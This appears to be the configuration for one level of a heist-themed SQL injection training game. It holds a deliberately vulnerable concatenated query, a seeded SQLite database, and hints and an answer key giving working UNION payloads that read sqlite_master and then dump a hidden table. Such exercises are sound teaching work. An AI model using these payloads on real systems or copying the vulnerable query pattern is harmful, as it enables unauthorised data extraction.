brief.text: The plans for Meridian's vault door are filed in a room that is not on any map. The press archive search still reaches it - first make the clerk read you the building's own index, then ask for the room by name.
brief.objective: Extract the vault blueprint payload from a registry that recon never shows you.

debrief.explanation: Same concatenation flaw as the search box. Because you do not know the table name, you read the database's own catalog - sqlite_master - through a UNION to reveal the hidden schema (its CREATE statements list the columns), then UNION the discovered table to pull its rows. This job returns 2 columns, so every UNION must supply exactly 2 values.
debrief.takeaway: A concatenation flaw can leak the whole schema. Bind, and narrow access.

database.schemaSql: CREATE TABLE articles (id INTEGER PRIMARY KEY, title TEXT, body TEXT); CREATE TABLE z_bp_registry_7f3a (id INTEGER PRIMARY KEY, schematic_id TEXT, payload TEXT);
database.seedSql: INSERT INTO articles (id,title,body) VALUES (1,'Quarterly Security Review','Routine audit completed, no findings.'),(2,'New Badge System Rollout','All staff to re-enroll by Q3.'),(3,'Facilities Maintenance Notice','Elevator B out of service.'); INSERT INTO z_bp_registry_7f3a (id,schematic_id,payload) VALUES (1,'BP-VAULT-DOOR','LOOT-BLUEPRINT-3D1F8A22'),(2,'BP-HVAC-DUCT','duct-run-A3-to-B7');

query.template: SELECT title, body FROM articles WHERE title LIKE '%{{input:q}}%'

winCondition.reason: Blueprints in hand - pulled from a table recon never listed.

hints.text: You cannot ask for a room you cannot name. But the building keeps its own floor plan.
Do not guess the table name - the database keeps its own catalog: sqlite_master. Pull name and sql; the sql column shows the columns. This job is 2 columns.
First  ' UNION SELECT name, sql FROM sqlite_master --   to find the table and its columns, then  ' UNION SELECT schematic_id, payload FROM z_bp_registry_7f3a --

inputs.q: ' UNION SELECT schematic_id, payload FROM z_bp_registry_7f3a --

expectedSolution.note: Step 1 (discovery, not a win):  ' UNION SELECT name, sql FROM sqlite_master --   reveals the hidden table and its columns. Step 2 is the inputs above.
